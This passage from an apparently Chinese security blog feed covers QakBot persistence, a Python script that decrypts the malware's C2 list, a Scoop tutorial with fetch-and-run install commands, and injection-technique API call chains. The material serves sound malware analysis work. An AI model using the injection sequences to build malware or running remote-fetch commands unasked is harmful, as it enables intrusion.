src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014115353503.png" alt="rc4_encode"></p><h4 id="3-3-3-SHA1"><a href="#3-3-3-SHA1" class="headerlink" title="3.3.3 SHA1"></a>3.3.3 SHA1</h4><p>在追踪网络通信的路上，可以发现存在SHA1算法函数，可以根据初始化的hash值来识别算法，循环分组处理代码：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014112000856.png" alt="SHA1-循环分组"></p><p>80轮分组运算如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014112045493.png" alt="SHA1-80轮分组运算"></p><h3 id="3-4-持久化分析"><a href="#3-4-持久化分析" class="headerlink" title="3.4 持久化分析"></a>3.4 持久化分析</h3><h4 id="3-4-1-定位思路"><a href="#3-4-1-定位思路" class="headerlink" title="3.4.1 定位思路"></a>3.4.1 定位思路</h4><p>对着解密出来的函数查看交叉引用，可以看到一些关键字符串，如下图：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012181407352.png" alt="持久化特征字符串"></p><p>定位过去依次分析，包括两种驻留方式：修改注册表Run键值和添加计划任务。</p><h4 id="3-4-2-注册表"><a href="#3-4-2-注册表" class="headerlink" title="3.4.2 注册表"></a>3.4.2 注册表</h4><p><strong>方式一：</strong>使用Windows API修改注册表项</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012181841460.png" alt="API修改注册表"></p><p><strong>方式二：</strong>启动reg.exe携带参数修改注册表</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012182029056.png" alt="创建进程修改注册表"></p><h4 id="3-4-3-计划任务"><a href="#3-4-3-计划任务" class="headerlink" title="3.4.3 计划任务"></a>3.4.3 计划任务</h4><p>创建schtasks.exe进程添加计划任务，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012182200892.png" alt="添加计划任务"></p><h3 id="3-6-C2配置提取"><a href="#3-6-C2配置提取" class="headerlink" title="3.6 C2配置提取"></a>3.6 C2配置提取</h3><p>根据rc4_encode()函数的交叉引用向上追，会找到加载资源相关的函数，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014151530511.png" alt="加载资源"></p><p>可以看见加载的资源id为5812，得到的powershell的字符串后续作为解密用。</p><p>查看这个ma_load_resource()函数的交叉引用会得到还有个位置引用它，资源id为3719。其中ma_liad_resource()函数内部如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014151801563.png" alt="ma_load_resource()"></p><p>对调用加载3719号资源的函数查看交叉引用，可以得到如下代码：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014151937178.png" alt="格式化id"></p><p>很是在格式化ip地址+端口的情况，在继续追加载资源后的ma_resource_decryptor()函数，最终会得到如下解密代码：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014152415360.png" alt="生成SHA1_KEY"></p><p>使用”\System32\WindowsPowerShell\v1.0\powershell.exe”作为明文生成rc4_key，再使用rc4对资源数据进行解密，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014153008646.png" alt="rc4解密"></p><p>编写Python3解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> pefile<br><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA1<br><br>key = <span class="hljs-string">b&#x27;\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span><br><br>sha1_key = SHA1.new(data=key).digest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_decryptor</span>(<span class="hljs-params">key_data, data</span>):<br>    data_cipher = ARC4.new(key_data)<br>    decrypted_config = data_cipher.decrypt(data)<br>    <span class="hljs-keyword">return</span> decrypted_config<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_resource</span>(<span class="hljs-params">filename, res_identifaction</span>):<br>    extracted_data = <span class="hljs-string">b&quot;&quot;</span><br>    pe = pefile.PE(filename)<br>    <span class="hljs-keyword">for</span> resource <span class="hljs-keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(resource, <span class="hljs-string">&#x27;directory&#x27;</span>):<br>            <span class="hljs-keyword">for</span> res_id <span class="hljs-keyword">in</span> resource.directory.entries:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(res_id, <span class="hljs-string">&#x27;name&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> (res_id.name):<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">str</span>(res_id.name)) == <span class="hljs-built_in">str</span>(res_identifaction):<br>                            offset = res_id.directory.entries[<span class="hljs-number">0</span>].data.struct.OffsetToData<br>                            resid_size = res_id.directory.entries[<span class="hljs-number">0</span>].data.struct.Size<br><br>    extracted_data = pe.get_memory_mapped_image()[offset:offset+resid_size]<br>    <span class="hljs-keyword">return</span> extracted_data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    filename = <span class="hljs-string">r&quot;C:\\Users\\yuanmingfei\\Desktop\\mas_2\\mas_2_dump.bin&quot;</span><br><br>    resource_data = extract_resource(filename, <span class="hljs-number">5812</span>)<br>    decrypted_data = data_decryptor(sha1_key, resource_data)[<span class="hljs-number">20</span>:]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DECRYPTED BOTNET AND CAMPATIGN ID: &#x27;</span>, end = <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-number">34</span>*<span class="hljs-string">&#x27;-&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(decrypted_data.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>))<br><br>    resource_data = extract_resource(filename, <span class="hljs-number">3719</span>)<br>    decrypted_data = data_decryptor(sha1_key, resource_data)<br><br>    resource_item = decrypted_data[<span class="hljs-number">21</span>:]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;C2 IP ADDRESS LIST:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>*<span class="hljs-string">&#x27;-&#x27;</span>)<br><br>    k = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(k &lt; <span class="hljs-built_in">len</span>(resource_item)):<br>        ip_item = resource_item[k:k+<span class="hljs-number">4</span>]<br>        ip_port = resource_item[k+<span class="hljs-number">4</span>:k+<span class="hljs-number">6</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IP[%d]: %s&quot;</span> % (i, ipaddress.IPv4Address(ip_item)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(binascii.hexlify(ip_port), <span class="hljs-number">16</span>))<br>        k = k + <span class="hljs-number">7</span><br>        i = i + <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>解密结果如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014153141695.png" alt="C2配置信息"></p><p>共计150条C2信息</p><h3 id="3-7-WMI分析"><a href="#3-7-WMI分析" class="headerlink" title="3.7 WMI分析"></a>3.7 WMI分析</h3><p>分析sub_1000D6D0()函数，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014161208397.png" alt="sub_1000D6D0"></p><p>可以得到以下信息：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">rclsid: 4590F811-1D3A-11D0-1F89-00AA004B2E24<br>riid: DC12A687-737F-11CF-884D-00AA004B2E24<br></code></pre></td></tr></table></figure><p>Google搜索riid，可以得知ppv类型为IWbemLocator，修改类型，按下F5刷新，伪代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014162118676.png" alt="WMI修复伪代码"></p><p>调用ConnectServer()函数将对象绑定到 ROOT\CIMV2 命名空间，并设置身份验证信息，将得到的指针返回上一级。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> malware analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows包管理工具 scoop</title>
      <link href="/2022/10/05/windows-bao-guan-li-gong-ju-scoop/"/>
      <url>/2022/10/05/windows-bao-guan-li-gong-ju-scoop/</url>
      
        <content type="html"><![CDATA[<h2 id="1-scoop包管理"><a href="#1-scoop包管理" class="headerlink" title="1. scoop包管理"></a>1. scoop包管理</h2><ol><li>寻找官方发布的软件源</li><li>下载（指定版本的）软件</li><li>运行软件安装器来安装下载得到的软件</li><li>修改环境，安装后的善后工作等</li></ol><h2 id="2-安装与卸载"><a href="#2-安装与卸载" class="headerlink" title="2.安装与卸载"></a>2.安装与卸载</h2><p><strong>需要在powershell下操作</strong></p><h3 id="2-1-普通用户"><a href="#2-1-普通用户" class="headerlink" title="2.1 普通用户"></a>2.1 普通用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 策略<br>Set-ExecutionPolicy RemoteSigned -scope CurrentUser;<br><br>// 设置路径<br><span class="hljs-variable">$env</span>:SCOOP = <span class="hljs-string">&#x27;C:\Tools\scoop&#x27;</span><br>[Environment]::SetEnvironmentVariable(<span class="hljs-string">&#x27;SCOOP&#x27;</span>, <span class="hljs-variable">$env</span>:SCOOP, <span class="hljs-string">&#x27;User&#x27;</span>)<br><br>// 安装<br>iwr -useb get.scoop.sh | iex<br>scoop install git<br>scoop update<br><br>// 卸载<br>scoop uninstall scoop<br></code></pre></td></tr></table></figure><h3 id="2-2-管理员权限"><a href="#2-2-管理员权限" class="headerlink" title="2.2 管理员权限"></a>2.2 管理员权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 生成ps脚本<br>irm get.scoop.sh -outfile <span class="hljs-string">&#x27;install.ps1&#x27;</span><br><br>// 修改策略<br>Set-ExecutionPolicy RemoteSigned -scope CurrentUser;<br><br>// 设置安装路径（scoop和apps）<br><span class="hljs-variable">$env</span>:SCOOP=<span class="hljs-string">&#x27;D:\SystemTools\scoop_apps&#x27;</span><br>[Environment]::SetEnvironmentVariable(<span class="hljs-string">&#x27;SCOOP&#x27;</span>, <span class="hljs-variable">$env</span>:SCOOP, <span class="hljs-string">&#x27;User&#x27;</span>)<br><br>// 安装<br> iex <span class="hljs-string">&quot;&amp; &#123;<span class="hljs-subst">$(irm get.scoop.sh)</span>&#125; -RunAsAdmin&quot;</span><br> scoop install git<br> scoop update<br> <br> // 卸载<br> scoop uninstall scoop<br></code></pre></td></tr></table></figure><h2 id="3-软件源配置"><a href="#3-软件源配置" class="headerlink" title="3.软件源配置"></a>3.软件源配置</h2><h3 id="3-1-添加软件源"><a href="#3-1-添加软件源" class="headerlink" title="3.1 添加软件源"></a>3.1 添加软件源</h3><h4 id="3-1-1-官方源"><a href="#3-1-1-官方源" class="headerlink" title="3.1.1 官方源"></a>3.1.1 官方源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 列出名字<br>scoop bucket known<br><br>// 直接添加<br>scoop bucket add &lt;bucket-name&gt;<br></code></pre></td></tr></table></figure><h4 id="3-1-2-第三方源"><a href="#3-1-2-第三方源" class="headerlink" title="3.1.2 第三方源"></a>3.1.2 第三方源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop bucket add &lt;bucket-name&gt; &lt;bucket-origin-url&gt;<br></code></pre></td></tr></table></figure><h4 id="3-1-3-自定义源"><a href="#3-1-3-自定义源" class="headerlink" title="3.1.3 自定义源"></a>3.1.3 自定义源</h4><p><a href="https://github.com/ScoopInstaller/Scoop/wiki/App-Manifests">App Manifests · ScoopInstaller&#x2F;Scoop Wiki (github.com)</a></p><p><a href="https://github.com/ScoopInstaller/Scoop/wiki/Buckets">Buckets · ScoopInstaller&#x2F;Scoop Wiki (github.com)</a></p><h3 id="3-2-列出已装软件源"><a href="#3-2-列出已装软件源" class="headerlink" title="3.2 列出已装软件源"></a>3.2 列出已装软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop bucket list<br></code></pre></td></tr></table></figure><h3 id="3-3-删除软件源"><a href="#3-3-删除软件源" class="headerlink" title="3.3 删除软件源"></a>3.3 删除软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop bucket <span class="hljs-built_in">rm</span> &lt;name&gt;<br></code></pre></td></tr></table></figure><h2 id="4-软件安装与卸载"><a href="#4-软件安装与卸载" class="headerlink" title="4.软件安装与卸载"></a>4.软件安装与卸载</h2><h3 id="4-1-搜索软件"><a href="#4-1-搜索软件" class="headerlink" title="4.1 搜索软件"></a>4.1 搜索软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop search &lt;incomplete-app-name&gt;<br></code></pre></td></tr></table></figure><h3 id="4-2-指定软件源安装"><a href="#4-2-指定软件源安装" class="headerlink" title="4.2 指定软件源安装"></a>4.2 指定软件源安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop install &lt;bucket-name&gt;/&lt;app-name&gt;<br></code></pre></td></tr></table></figure><h3 id="4-3-列出已装软件"><a href="#4-3-列出已装软件" class="headerlink" title="4.3 列出已装软件"></a>4.3 列出已装软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop list<br></code></pre></td></tr></table></figure><h3 id="4-4-更新软件"><a href="#4-4-更新软件" class="headerlink" title="4.4 更新软件"></a>4.4 更新软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop update &lt;app-name&gt;<br></code></pre></td></tr></table></figure><h3 id="4-5-删除软件"><a href="#4-5-删除软件" class="headerlink" title="4.5 删除软件"></a>4.5 删除软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop unistall &lt;app-name&gt;<br></code></pre></td></tr></table></figure><h2 id="5-拓展功能"><a href="#5-拓展功能" class="headerlink" title="5.拓展功能"></a>5.拓展功能</h2><h3 id="5-1-设置scoop自动补全"><a href="#5-1-设置scoop自动补全" class="headerlink" title="5.1 设置scoop自动补全"></a>5.1 设置scoop自动补全</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 安装插件<br>scoop bucket add extras<br>scoop install scoop-completion<br>// 编辑配置文件<br><span class="hljs-keyword">if</span> (!(Test-Path <span class="hljs-variable">$profile</span>)) &#123; New-Item -Path <span class="hljs-variable">$profile</span> -ItemType <span class="hljs-string">&quot;file&quot;</span> -Force &#125;<br><span class="hljs-variable">$profile</span>// 打印出位置<br>// 配置文件中添加<br>Import-Module <span class="hljs-string">&quot;<span class="hljs-subst">$($(Get-Item $(Get-Command scoop.ps1)</span>.Path).Directory.Parent.FullName)\modules\scoop-completion&quot;</span><br></code></pre></td></tr></table></figure><h3 id="5-2-安装aria2加快下载速度"><a href="#5-2-安装aria2加快下载速度" class="headerlink" title="5.2 安装aria2加快下载速度"></a>5.2 安装aria2加快下载速度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scoop install aria2<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> package-manager </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Malware Analysis 脱壳与C2提取</title>
      <link href="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/"/>
      <url>/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-加密壳的特征"><a href="#1-加密壳的特征" class="headerlink" title="1.加密壳的特征"></a>1.加密壳的特征</h2><ul><li>程序只有很少的导入DLL和函数</li><li>存在很多混淆的字符串</li><li>存在直接的系统调用</li><li>不规范的节区名字</li><li>不常见的可执行节区（应该只用.text&#x2F;.code节是可执行的）</li><li>意外的可写节区</li><li>raw-size和virtual-size之间差异很大</li><li>存在0大小的节区</li><li>缺少网络通信相关的API</li><li>缺乏用于恶意软件功能的基本 API（例如，勒索软件中的 Crypt* 功能）</li><li>不常见的文件格式和头</li><li>OEP指向 .text&#x2F;.code 之外的其他部分</li><li>资源部分（.rsrc 部分）很大，代码中存在 LoadResource( ) 函数</li><li>存在叠加层</li><li>在IDA中的彩条中发现很大的数据和未被探索的代码</li></ul><h2 id="2-虚拟化壳的特征"><a href="#2-虚拟化壳的特征" class="headerlink" title="2.虚拟化壳的特征"></a>2.虚拟化壳的特征</h2><ul><li>通常是64位的</li><li>IAT表被移除或者只有一个导入函数</li><li>大多数字符串都被加密了</li><li>存在内存完整性校验和保护</li><li>指令被虚拟并且被翻译成RISC指令</li><li>虚拟指令在内存中加密存储</li><li>混淆是基于栈的，因此使用静态方法处理虚拟化代码非常困难</li><li>大部分虚拟化代码都是多态的，所以有很多虚拟指令指的是同一条原始指令</li><li>有数千行push指令，其中许多都是没用的</li><li>使用无条件跳转实现代码重排</li><li>存在控制流平坦化、反调试、反虚拟机等技术</li><li>并非所有 x64 指令都是虚拟化的，因此您会发现包含虚拟化和非虚拟化（原始）指令混合的二进制代码</li><li>大多数时候，函数的序言和尾声都没有被虚拟化</li><li>原始代码可以被分散存放，因此指令和数据将混合在一起</li><li>引用导入函数的指令可能被清零或被替换成NOP，因此这些位置将被动态恢复。有时，这些引用位置不为0，被修改为指向一张假的IAT表，此时为IAT混淆</li><li>在 shellcode 和常见恶意软件中使用的 API 名称是经过hash的</li><li>从原始寄存器到虚拟寄存器的转换通常是一对一的，但并非总是如此。此外，还有一个上下文切换组件负责将寄存器和标志信息传输到虚拟机上下文中</li><li>虚拟机处理程序来自data段</li><li>许多原始API被重定向到转发调用的存根代码处</li><li>使用了如常量展开、基于模式的混淆、间接控制、函数内联、代码复用，不透明谓词等混淆技术</li></ul><h2 id="3-调试已加壳程序注意事项"><a href="#3-调试已加壳程序注意事项" class="headerlink" title="3.调试已加壳程序注意事项"></a>3.调试已加壳程序注意事项</h2><ul><li>使用反反调试插件来过掉常规反调试，甚至使用内核调试器</li><li>注意主机名、账户名、以及样本名（程序检测文件名是否是hash）</li><li>为虚拟机分配100GB以上的磁盘空间</li><li>为虚拟机拍摄开机时间超过20分钟的快照</li><li>Process Hacker、Process Explorer、Process Monitor等知名工具的恶意代码检查（建议在使用前重命名这些可执行二进制文件）</li></ul><h2 id="4-脱壳后的修复工作"><a href="#4-脱壳后的修复工作" class="headerlink" title="4.脱壳后的修复工作"></a>4.脱壳后的修复工作</h2><ul><li>修复PE文件头</li><li>修复OEP，可能是0或者是错误的RVA</li><li>修复IAT</li><li>修复ImageBase</li><li>检查dump到的数据是已映射的还是未映射的</li></ul><h2 id="5-恶意代码中常用的注入状态机"><a href="#5-恶意代码中常用的注入状态机" class="headerlink" title="5.恶意代码中常用的注入状态机"></a>5.恶意代码中常用的注入状态机</h2><h3 id="5-1-远程线程注入"><a href="#5-1-远程线程注入" class="headerlink" title="5.1 远程线程注入"></a>5.1 远程线程注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">OpenProcess</span>( ) -&gt; <br><span class="hljs-built_in">VirtualAllocEx</span>( ) -&gt; <br><span class="hljs-built_in">WriteProcessMemory</span>( ) -&gt; <br><span class="hljs-built_in">CreateRemoteThreat</span>( ) | <span class="hljs-built_in">NtCreateThread</span>( ) | <span class="hljs-built_in">RtlCreateUserThread</span>( )<br></code></pre></td></tr></table></figure><h3 id="5-2-自注入"><a href="#5-2-自注入" class="headerlink" title="5.2 自注入"></a>5.2 自注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">OpenThread</span>( ) -&gt;<br><span class="hljs-built_in">SuspendThread</span>( ) -&gt;<br><span class="hljs-built_in">VirtualAllocEx</span>( ) -&gt; <br><span class="hljs-built_in">WriteProcessMemory</span>( ) -&gt;<br><span class="hljs-built_in">SetThreatContext</span>( ) -&gt;<br><span class="hljs-built_in">ResumeThreat</span>( ) | <span class="hljs-built_in">NtResumeThread</span>( )<br></code></pre></td></tr></table></figure><h3 id="5-3-反射式注入"><a href="#5-3-反射式注入" class="headerlink" title="5.3 反射式注入"></a>5.3 反射式注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">Cobalt Strike中使用的一套API：<br><br><span class="hljs-built_in">CreateFileMapping</span>( ) -&gt;<br>Nt/<span class="hljs-built_in">MapViewOfFile</span>( ) -&gt;<br><span class="hljs-built_in">OpenProcess</span>( ) -&gt; <br><span class="hljs-built_in">memcpy</span>( ) -&gt;<br>Nt/<span class="hljs-built_in">MapViewOfSection</span>( ) -&gt;<br><span class="hljs-built_in">OpenProcess</span>( ) -&gt;<br><span class="hljs-built_in">CreateThread</span>( ) | <span class="hljs-built_in">NtQueueApcThread</span>( ) | <span class="hljs-built_in">CreateRemoteThread</span>( ) | <span class="hljs-built_in">RtlCreateUserThread</span>( )<br>    <br><span class="hljs-comment">// 变体</span><br><span class="hljs-built_in">VirtualQueryEx</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ReadProcessMemory</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-4-APC注入"><a href="#5-4-APC注入" class="headerlink" title="5.4 APC注入"></a>5.4 APC注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">SleepEx</span>( ) | <span class="hljs-built_in">SignalObjectAndWait</span>( ) | <span class="hljs-built_in">MsgWaitForMultipleObjectsEx</span>( ) | <span class="hljs-built_in">WaitForMultipleObjectsEx</span>( ) | <span class="hljs-built_in">WaitForSingleObjectEx</span>( )<br><span class="hljs-built_in">CreateToolhelp32Snapshot</span>(), <span class="hljs-built_in">Process32First</span>( ),<span class="hljs-built_in">Process32Next</span>( ), <span class="hljs-built_in">Thread32First</span>( ), <span class="hljs-built_in">Thread32Next</span>( )<br><span class="hljs-built_in">QueueUserAPC</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">KeInitializeAPC</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-5-傀儡进程"><a href="#5-5-傀儡进程" class="headerlink" title="5.5 傀儡进程"></a>5.5 傀儡进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateProcess</span>( ), <span class="hljs-built_in">NtQueryProcessInformation</span>( ), <span class="hljs-built_in">GetModuleHandle</span>( ),<br>Zw/<span class="hljs-built_in">NtUnmapViewOfSection</span>( ), <span class="hljs-built_in">VirtualAllocEx</span>( ), <span class="hljs-built_in">WriteProcessMemory</span>( ), <span class="hljs-built_in">GetThreadContext</span>( ),<br><span class="hljs-built_in">SetThreadContext</span> ( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ResumeThread</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-6-AtomBombing"><a href="#5-6-AtomBombing" class="headerlink" title="5.6 AtomBombing"></a>5.6 AtomBombing</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">OpenThread</span>( ) -&gt; <br><span class="hljs-built_in">GlobalAddAtom</span>( ) -&gt;<br><span class="hljs-built_in">GlobalGetAtomName</span>( ) -&gt;<br><span class="hljs-built_in">QueueUserAPC</span>( )<br></code></pre></td></tr></table></figure><h3 id="5-7-Process-Doppelganging"><a href="#5-7-Process-Doppelganging" class="headerlink" title="5.7 Process Doppelgänging"></a>5.7 Process Doppelgänging</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateTransaction</span>( ), <span class="hljs-built_in">CreateFileTransaction</span>( ), NtCreateSection, <span class="hljs-built_in">NtCreateProcessEx</span>( ),<br><span class="hljs-built_in">NtQueryInformationProcess</span>( ), <span class="hljs-built_in">NtCreateThreadEx</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">RollbackTransaction</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-8-Process-Herpaderping"><a href="#5-8-Process-Herpaderping" class="headerlink" title="5.8 Process Herpaderping"></a>5.8 Process Herpaderping</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateFile</span>( ), <span class="hljs-built_in">NtCreateSection</span>( ), <span class="hljs-built_in">NtCreateProcessEx</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">NtCreateThreadEx</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-9-全局钩子注入"><a href="#5-9-全局钩子注入" class="headerlink" title="5.9 全局钩子注入"></a>5.9 全局钩子注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">SetWindowsHookEx</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">PostThreadMessage</span><span class="hljs-params">( 